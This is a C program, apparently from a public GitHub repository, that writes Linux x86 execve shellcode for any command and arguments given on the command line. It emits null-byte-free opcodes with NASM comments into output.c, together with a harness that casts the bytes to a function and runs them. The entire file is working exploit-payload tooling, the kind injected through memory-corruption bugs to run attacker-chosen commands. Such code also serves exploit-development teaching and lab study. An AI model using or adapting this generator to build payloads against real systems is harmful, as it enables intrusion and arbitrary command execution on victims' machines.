//https://github.com/CallumBodels/Linux-x86-Execve-Shellcode-Generator
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void pushString(FILE* f,char* shellcode);
char* pad(char* string,char* padWith);
void createPointerArray(FILE *f,int size);

int main(int argc, char *argv[]){
	if(argc > 1){
		FILE *f = fopen("output.c","w");
		//write to the file the C imports and setup the char* opcode container
		fprintf(f, "#include <stdio.h>\n#include <unistd.h>\n\n//Assemlbly comments in NASM syntax.\nchar *shellcode=\"\\x31\\xc0\" //xor eax,eax\n");

		pushString(f,pad(argv[1],"/"));
		//push current stack point into ebx, aka pointer to argv[1]
		fprintf(f, "\"\\x89\\xe3\" //mov ebx,esp\n");

		createPointerArray(f,(argc-1));

		//push each arg of the desired command onto stack, get the addr and then insert the addr into the argv[] array
		for(int i = 2; i < argc; i++){
			//if arg to add starts with tac use dif method as currently function doesnt work with strings with '-'s
			char tac = '-';
			if( (strncmp(&tac, argv[i], 1) == 0) ){
				pushString(f,argv[i]);
			}else{
				pushString(f,pad(argv[i]," "));
			}
			//get the addr of the current string just pushed onto stack and then move the addr onto the argv[] array
			fprintf(f, "\"\\x89\\xe2\" //mov edx,esp\n\"\\x89\\x51\\x%x\" //mov [ecx+%d],edx\n",((i-1)*4),((i-1)*4));
		}

		//point the envp[] arg of execve to null
		//push execve sys call number(11) into eax, and call sys interupt to execute execve
		//write to file C code function to call the opcode shellcode char* output
		fprintf(f, "\"\\x50\" //push eax\n\"\\x89\\xe2\" //mov edx,esp\n\"\\xb0\\x0b\" //mov al,11\n\"\\xcd\\x80\"; //int $0x80\n\nint main(){\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n}\n");
		fclose(f);
	}else{
		printf("Usage: ./shellcodeGenerator.out <desired command> <(OPTIONAL)desired args>... \n");
	}
}

void createPointerArray(FILE* f,int size){
	//push null pointer arguement, as they will be elements in the array, the null pointers will be overwritten later with the elements addr after we know it from pushing them onto the stack
	//extra null pointer at the end to show the end of the array
	for(int i = 0; i < size; i++){
		fprintf(f, "\"\\x50\" //push eax\n");
	}
	//push ebx onto the end of the array; as it is the first element of the array
	//and then save the addr of the array into ecx
	fprintf(f, "\"\\x53\" //push ebx\n\"\\x89\\xe1\" //mov ecx,esp\n");
}

void pushString(FILE* f,char* string){
	//push eax for null byte to show end of string
	fprintf(f, "\"\\x50\" //push eax\n");
	//push hex of each char of the string in reverse order
	int left = strlen(string);
	if(left%2 > 0){//cheaty assembly to push 1 byte without 00's
		//load char into ax reg
		fprintf(f, "\"\\xb0\\x%x\" //movb al,'%c'\n",string[left-1],string[left-1]);
		//push ax, xor eax
		fprintf(f, "\"\\x66\\x50\" //pushw ax\n \"\\x31\\xc0\" //xor eax, eax\n");
		left = left - 1;
	}
	while( left/4 > 0 ){
		fprintf(f,"\"\\x68\\x%x\\x%x\\x%x\\x%x\" //push '%c%c%c%c'\n",string[left-4],string[left-3],string[left-2],string[left-1],string[left-4],string[left-3],string[left-2],string[left-1]);
		left = left - 4;
	}
	if( left/2 > 0 ){
		fprintf(f, "\"\\x66\\x68\\x%x\\x%x\" //pushw '%c%c'\n",string[left-2],string[left-1],string[left-2],string[left-1]);
		left = left - 2;
	}
}

char* pad(char* string,char* padWith){
	//work out how many spaces are needed for padding and setup string of that size
	int paddingNeeded = (4 -((strlen(string))%4));
	//extra char for null byte to show strings ended
	char* returning = calloc((paddingNeeded+strlen(string)+1),sizeof(char));

	char space = ' ';
	if( (strncmp(&space, padWith, 1) == 0) ){
		//add spaces at end of the arg as it doesnt effect the arg
		strncpy(&returning[0],string,strlen(string));
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&returning[(i+strlen(string))]," ",1);
		}
	}else{
		//add slashes at start of the command as it doesnt effect the command
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&returning[i],"/",1);
		}
		strncpy(&returning[paddingNeeded],string,strlen(string));
	}

	return (returning);
}
